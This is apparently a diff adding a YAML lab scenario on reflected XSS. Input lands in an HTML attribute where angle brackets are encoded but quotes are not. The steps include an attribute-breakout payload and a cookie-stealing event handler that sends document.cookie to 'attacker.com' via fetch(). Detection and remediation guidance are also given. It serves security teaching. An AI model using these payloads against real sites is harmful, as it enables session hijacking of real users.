@@ -1,0 +1,91 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS into attribute with angle brackets HTML-encoded"
+id: "xss-reflected-attribute-001"
+category: "xss"
+subcategory: "reflected"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers reflected XSS where the input is reflected inside
+  an HTML tag attribute (e.g., `<input value="USER_INPUT">`) and angle
+  brackets are encoded, but quotes and other characters are not properly
+  handled. The attacker can break out of the attribute using quotes.
+
+learning_objectives:
+  - Understand how to break out of HTML attributes
+  - Use quotes and other characters to inject events
+  - Exploit when angle brackets are encoded but quotes are not
+
+tools:
+  - Burp Suite
+  - curl
+
+prerequisites:
+  - Basic understanding of HTML attributes
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify attribute where input is reflected"
+    commands:
+      - "# Test with a string containing quotes: param=\"test\""
+      - "# Observe if the quotes appear in the response"
+    expected_output: "Input is reflected inside an HTML attribute"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Break out of the attribute and inject an event handler"
+    commands:
+      - "# Payload: \" onmouseover=alert('XSS') "
+      - "# This will close the attribute and add an event handler"
+    expected_output: "Alert triggers when mouse hovers"
+    detection: "Web server logs may show unusual parameters"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Steal cookies or perform actions"
+    commands:
+      - "# Payload: \" onmouseover='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)' "
+    expected_output: "Cookie exfiltrated"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with payloads containing quotes and event handlers"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Encode quotes and other special characters in attributes"
+    - "Use a context-aware encoding library"
+  long_term:
+    - "Use a whitelist of allowed attributes and values"
+    - "Implement CSP to block inline event handlers"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "How can you break out of an HTML attribute?"
+  - "What characters are important to encode in attributes?"
+  - "Why is event handler injection dangerous?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    title: "OWASP XSS Prevention"
